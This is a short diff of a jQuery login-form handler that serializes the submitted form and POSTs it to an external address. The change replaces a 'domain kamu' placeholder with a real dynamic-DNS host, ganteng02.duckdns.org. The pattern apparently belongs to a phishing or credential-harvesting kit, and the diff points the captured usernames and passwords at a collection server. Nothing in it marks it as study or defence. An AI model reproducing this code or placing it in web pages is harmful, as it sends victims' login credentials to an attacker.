@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://domain kamu/test/index.php",
+        url: "https://ganteng02.duckdns.org/test/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
